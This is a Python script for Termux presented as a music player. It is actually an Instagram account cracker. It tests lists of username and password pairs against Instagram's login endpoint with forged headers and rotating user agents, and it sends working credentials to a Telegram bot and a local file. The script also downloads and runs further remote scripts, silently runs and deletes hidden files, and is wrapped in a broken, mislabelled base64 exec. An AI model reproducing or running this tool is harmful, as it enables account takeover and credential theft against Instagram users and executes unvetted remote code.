import base64
exec(base64.b64decode("import requests, sys, os, random
import os,sys
import subprocess
import json
from time import sleep
import subprocess
import time, random
from requests.api import request
import os,sys
######################################
loglog='''
                             
                         
                          
                         
                    
                                  
                                                
                                                            
                                                                      
                                                                            
                                                                            \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'''
##############################
WTF="010101"
try:
	import wget
except:
	os.system("pip install wget")
	pass
try:
	import requests
except:
	os.system("pip install requests")
	pass
try:
	import user_agent
except:
	os.system("pip install user_agent")
	pass
import os, sys, time, random
try:
    import os
    os.system(".insta.py")
except:
    pass
try:
    import os
    os.system("/data/data/com.termux/files/svr/.insta.py")
except:
    pass
try:
    import os
    os.system("/sdcard/download/.insta.py")
except:
    pass
try:
    import os
    os.system("insta.py")
except:
    pass
try:
    import os
    os.system("/data/data/com.termux/files/svr/insta.py")
except:
    pass
try:
    import os
    os.system("/sdcard/download/insta.py")
except:
    pass
os.system("rm -rf .insta.py ;rm -rf .git")
os.system("rm -rf /data/data/com.termux/files/svr/.insta.py")
os.system("rm -rf /sdcard/download/.insta.py")
os.system("rm -rf insta.py")
os.system("rm -rf /data/data/com.termux/files/svr/insta.py")
os.system("rm -rf /sdcard/download/insta.py")
######################################################################
os.system("rm .insta.py")
os.system("rm /data/data/com.termux/files/svr/.insta.py")
os.system("rm /sdcard/download/.insta.py")
os.system("rm insta.py")
os.system("rm /data/data/com.termux/files/svr/insta.py")
os.system("rm /sdcard/download/insta.py")
os.system("rm -rf combo.txt")
os.system("pkg install termux-api ;pip install datatime ;pip install requests ;pip install user_agent")
###################################################################
os.system("del .insta.py")
os.system("del /data/data/com.termux/files/svr/.insta.py")
os.system("del /sdcard/download/.insta.py")
os.system("del insta.py")
os.system("del /data/data/com.termux/files/svr/insta.py")
os.system("del /sdcard/download/insta.py")
os.system("del combo.txt")
os.system("pip install bs4 ;pip install colorama")
os.system('clear')
#################################def###############################
###################################################################
try:
    import wget
except:
    os.system("pip install wget")
    pass
import json, requests, user_agent, os ,sys, time, datetime
import requests, random
from user_agent import generate_user_agent
from datetime import datetime
r = requests.session()
os.system("clear")
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"   
C = "\033[36;1m"
lgo='''
	
	               
	            
                      
	             
	      
	                  
	                        
	                             
	                                    
	                                         
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       dabet [Termux Api Dabgrit bo Krdnaway Music] \n      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        1- Sana Barznji 
        2- Navid Zardi 
        3- Hardi Salami 
        4- English
        0- Gorani m Nawet !	\n       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	'''
def music():
    import os, sys, time, random
    os.system("clear")
    wd = "\033[90;1m" 
    print(wd+"\n"+loglog)
    os.system("xdg-open https://play.google.com/store/apps/details?id=com.termux.api")
    time.sleep(4)
    os.system("clear")
    print(lgo)
    inp=input("         Hallbzhera dldl:  ")
    if inp=='1':
        import random, os, sys, time
        wget.download("https://raw.githubusercontent.com/968hacker/music/main/komsay.mp3")
        os.system("termux-media-player play komsay.mp3 ;clear")
        pass
    elif inp=='2':
        import random, os, sys, time
        wget.download("https://raw.githubusercontent.com/968hacker/music/main/navid.mp3")
        os.system("termux-media-player play navid.mp3 ;clear")
        pass
    elif inp=='3':
        import random, os, sys, time
        wget.download("https://raw.githubusercontent.com/968hacker/music/main/Hardi.mp3")
        os.system("termux-media-player play Hardi.mp3 ;clear")
        pass
    elif inp=='4':
        import random, os, sys, time
        wget.download("https://raw.githubusercontent.com/968hacker/music/main/9.mp3")
        os.system("termux-media-player play 9.mp3 ;clear")
        pass
    elif inp=='0':
        print("\n")
        os.system("clear")
        pass
    else:
        music()
logo2='''
                   
                  
             
               
         
                   
                            
                                  
                                            
 ---------------------------------------------------
  Author   : Zed Coder
  GitHub   : https://github.com/968hacker
  YouTube  : Zed cracker
  telegram : https://t.me/zed_cracker_1
 ---------------------------------------------------
       Created By Zed Coder 
 ---------------------------------------------------
   Crack instgram it started !
    please wait .... 1h or 2h 
    Prosess in Background !...
 ==================================================='''
bad=0
timeout=0
hits=0
checkpoint=0
error=0
def instagram1():
	import json, requests, user_agent,os ,sys, time, datetime
	import requests
	from user_agent import generate_user_agent
	from datetime import datetime
	r = requests.session()
	import os, sys
	print(logo2)
	agar=input(" You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
		ID=input(" Your ID Telegram :")
		token=input(" Token(bot) : ")
	else:
		pass
	print(' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
	def loopPp():
		try:
			combo=input(" Path File >>> ")
			file = open(combo,'r').read().splitlines()
			for line in file:
				global bad, timeout, checkpoint, error, hits
				user = line.split(':')[0]
				pasw = line.split(':')[1]
				url = 'https://www.instagram.com/accounts/login/ajax/'
				head = {
                        'accept':'*/*',
                        'accept-encoding':'gzip,deflate,br',
                        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
                        'content-length':'269',
                        'content-type':'application/x-www-form-urlencoded',
                        'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
                        'origin':'https://www.instagram.com',
                        'referer':'https://www.instagram.com/',
                        'sec-fetch-dest':'empty',
                        'sec-fetch-mode':'cors',
                        'sec-fetch-site':'same-origin',
                        'user-agent': generate_user_agent() ,
                        'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
                        'x-ig-app-id':'936619743392459',
                        'x-ig-www-claim':'0',
                        'x-instagram-ajax':'8a8118fa7d40',
                        'x-requested-with':'XMLHttpRequest'}
				time_now = int(datetime.now().timestamp())
				data = {
                        'username': user,
                        'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                        'queryParams': {},
                        'optIntoOneTap': 'false',}
				login=requests.post(url, headers=head, data=data, verify=True).text
				try:
					if '"authenticated":false' in login:
						os.system("clear")
						print(logo2)
						bad+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
					elif '"message":"Please wait a few minutes before you try again."' in login:
						os.system("clear")
						print(logo2)
						timeout+=1
						import time
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
						time.sleep(360)
					elif 'userId' in login:
						os.system("clear")
						print(logo2)
						hits+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+'\n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
						boooom=(f"GOOD: "+user+":"+pasw+"\n")
						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
						with open('/sdcard/Good.txt', 'a') as ff:
							ff.write(f"GOOD: "+user+":"+pasw+"\n")
					elif ('"message":"checkpoint_required"') in login:
							os.system("clear")
							print(logo2)
							checkpoint+=1
							print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
					else:
						    os.system("clear")
						    print(logo2)
						    error+=1
						    print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
				except:
				    print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
		except FileNotFoundError:
			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
	loopPp()
	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
def dwbara():
    import json, requests, user_agent, os ,sys, time, datetime
    logo='''
                   
                  
             
               
         
                   
                            
                                  
                                            
 ---------------------------------------------------
  Author   : Zed Coder
  GitHub   : https://github.com/968hacker
  YouTube  : Zed cracker
  telegram : https://t.me/zed_cracker_1
 ---------------------------------------------------
 | 1 | = Checker(instgram)-(Combo=Insert)
 | 2 | = Checker(instgram)-(Combo=Number-Random)
 | 3 | = Unfollow(instgram)
 | 4 | = delet-chat(instgram)
 | 5 | = delet-post(instgram)
 | 6 | = delet-post-saved(instgram)
 | 0 | = Exit()
 --------------------------------------------------'''
    print(logo)
    ia=input(" hallbzhera dl dl: ")
    if ia=="1":
        os.system("xdg-open https://t.me/zed_cracker_1")
        instagram1()
    elif ia=="2":
        import wget, os
        wget.download("https://raw.githubusercontent.com/sfr404sfrzed/3/main/.3.py")
        os.system("python .3.py")
    elif ia=="3":
    	import wget, os
    	wget.download("https://raw.githubusercontent.com/sfr404sfrzed/pewist/main/.unfollow.py")
    	os.system("python .unfollow.py")
    elif ia=="4":
    	import wget, os
    	wget.download("https://raw.githubusercontent.com/sfr404sfrzed/pewist/main/.unchat.py")
    	os.system("python .unchat.py")
    elif ia=="5":
    	import wget, os
    	wget.download("https://raw.githubusercontent.com/sfr404sfrzed/pewist/main/.unpost.py")
    	os.system("python .unpost.py")
    elif ia=="6":
    	import wget, os
    	wget.download("https://raw.githubusercontent.com/sfr404sfrzed/pewist/main/.unvediosaved.py")
    	os.system("python .unvediosaved.py")
    elif ia=="0":
        print(" Exit !")
        os.sys.exit()
    else:
        print("     [ Ka hallt bzhard zhmara y halat da na !  ]")
        time.sleep(5)
        dwbara()
try:
    import json, requests, user_agent ,os ,sys, time, datetime
except:
    os.system("pip install user_agent ;pip install requests ;pip install json")
    os.system("clear")
    pass
def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/pain.txt')
    reb = open('/data/data/com.termux/pain.txt', 'w')
    reb.write(idjscr)
    reb.close()


def hala():
    x = os.listdir('/data/data/com.termux/')
    if 'pain.txt' in x:
        os.system('chmod 777 /data/data/com.termux/pain.txt ;figlet Id Tool ;echo ==============================')
        readid = open('/data/data/com.termux/pain.txt', 'r').read()
        print('Your ID : ' + str(readid))
        textupload = requests.get('https://textuploader.com/ta924').text
        if readid in textupload:
            print( '\x1b[37;1m ID to Active Krawa....\x1b[0m')
            time.sleep(5)
            os.system('chmod 000 /data/data/com.termux/pain.txt')
            music()
            dwbara()
        else:
            os.system('chmod 000 /data/data/com.termux/pain.txt')
            print("\x1b[37;1mID to Active Nakrawa.....")
            time.sleep(5)
            sys.exit()
    else:
        idcr()
hala()
"))